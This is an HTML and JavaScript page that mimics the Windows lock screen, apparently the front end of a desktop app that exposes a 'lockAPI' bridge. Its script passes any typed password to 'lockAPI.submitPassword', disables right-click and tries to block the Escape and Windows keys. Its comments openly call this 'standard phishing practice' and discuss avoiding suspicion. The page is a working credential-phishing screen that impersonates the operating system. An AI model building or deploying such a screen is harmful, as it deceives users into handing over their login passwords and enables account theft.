<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Windows Default Lock Screen</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: url('https://w.wallhaven.cc/full/wq/wallhaven-wqery7.jpg') no-repeat center center fixed;
            background-size: cover;
            overflow: hidden;
            user-select: none;
            cursor: default;
        }
        .overlay {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.4);
            backdrop-filter: blur(20px);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .user-icon {
            width: 150px;
            height: 150px;
            border-radius: 50%;
            background: #ccc url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23fff"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>') center center no-repeat;
            background-size: 100px;
            margin-bottom: 20px;
        }
        .username {
            font-size: 32px;
            color: white;
            margin-bottom: 30px;
            font-weight: 400;
        }
        .password-container {
            position: relative;
            width: 300px;
        }
        input[type="password"] {
            width: 100%;
            padding: 10px 40px 10px 10px;
            font-size: 16px;
            border: 2px solid transparent;
            border-radius: 4px;
            background: rgba(255, 255, 255, 0.2);
            color: white;
            outline: none;
            box-sizing: border-box;
        }
        input[type="password"]::placeholder {
            color: rgba(255, 255, 255, 0.7);
        }
        input[type="password"]:focus {
            background: rgba(255, 255, 255, 0.9);
            color: black;
            border-color: #0078D7;
        }
        input[type="password"]:focus::placeholder {
            color: rgba(0, 0, 0, 0.5);
        }
        .submit-btn {
            position: absolute;
            right: 5px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: white;
            font-size: 20px;
            cursor: pointer;
            outline: none;
        }
        input[type="password"]:focus + .submit-btn {
            color: #0078D7;
        }
        .error-msg {
            color: #ffb900;
            margin-top: 10px;
            font-size: 14px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="overlay">
        <div class="user-icon"></div>
        <div class="username" id="username">User</div>
        <div class="password-container">
            <input type="password" id="pwd" placeholder="Password" autofocus>
            <button class="submit-btn" id="submitBtn">➔</button>
        </div>
        <div class="error-msg" id="errorMsg">The password is incorrect. Try again.</div>
    </div>

    <script>
        window.lockAPI.getUsername().then(name => {
            document.getElementById('username').innerText = name || 'User';
        });

        const pwdInput = document.getElementById('pwd');
        const submitBtn = document.getElementById('submitBtn');
        const errorMsg = document.getElementById('errorMsg');

        let attempts = 0;

        function submit() {
            const pwd = pwdInput.value;
            if (!pwd) return;

            if (attempts === 0) {
                // First try: Always pretend it's wrong to get a higher chance of correct password if they mistyped
                // But let's just accept it the first time so they don't get suspicious?
                // No, standard phishing practice is to accept immediately and close to avoid suspicion.
                window.lockAPI.submitPassword(pwd);
            }
        }

        pwdInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') submit();
        });

        submitBtn.addEventListener('click', submit);
        
        // Prevent right click and other keys
        document.addEventListener('contextmenu', event => event.preventDefault());
        document.addEventListener('keydown', (e) => {
            if(e.key === 'Escape' || e.key === 'Windows') {
                e.preventDefault();
            }
        });
    </script>
</body>
</html>
